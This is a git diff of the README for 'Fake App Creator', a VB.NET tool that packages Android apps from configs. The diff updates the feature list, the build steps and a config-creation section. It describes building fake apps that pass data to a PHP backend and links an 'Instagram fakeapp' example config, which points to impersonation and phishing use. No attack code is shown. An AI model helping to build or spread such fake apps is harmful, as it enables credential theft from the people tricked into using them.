@@ -9,10 +9,10 @@ Fake App Creator is an .net based application written by VB.NET . With this app 
 
 # :memo: Features & To do list
 - [x] Custom Server Files
-- [x] App Preview
+- [x] App Preview [Screenshot](http://s3.img7.ir/dZtXM.png)
+- [X] Create Configs [Screenshot](http://s3.img7.ir/qtUvR.png)
 - [x] Autosign
-- [x] Config Password
-- [x] Capturing
+- [x] Config Password [Screenshot](http://s3.img7.ir/qtUvR.png)
 - [ ] Custom Entries
 
 
@@ -26,14 +26,23 @@ Fake App Creator is an .net based application written by VB.NET . With this app 
 - Ionic.Zip [Nuget](https://www.nuget.org/packages/DotNetZip/) | [CodePlex](https://dotnetzip.codeplex.com/)
 - Extra files [Download](https://github.com/sahand100/FAC/raw/master/Extras.zip) ( It Contains [Sign.jar](https://github.com/appium/sign) , [Apktool.jar](https://ibotpeaches.github.io) , some .bat files & Some folders )
 
-:wrench: Steps To Build
-- Download Project
-- Add Packages
+:wrench: Steps to build
+- Download project
+- Add packages
 - Build 
-- Copy Extra.zip s Files Beside Result .exe File
+- Copy Extra.zip s files beside results (.exe file)
 - Run :simple_smile:
 
-# :rocket: How To Build Configs 
+# :rocket: How to create config
 
-:hatching_chick: Things You Need :
-- Know how to build 
+:hatching_chick: Things you need :
+- Know how to build android applications
+- Know how to code php to get data from app
+- Know how to html (css , js ) for app design
+
+:hatching_chick: Steps to create :
+*This Section is not complete yet !
+
+:triangular_ruler: Example config
+- Instagram fakeapp : [Raw](https://github.com/sahand100/FAC/raw/master/Instagram%20Config%20Raw.zip) | [Packaged](https://github.com/sahand100/FAC#rocket-how-to-create-config)
+
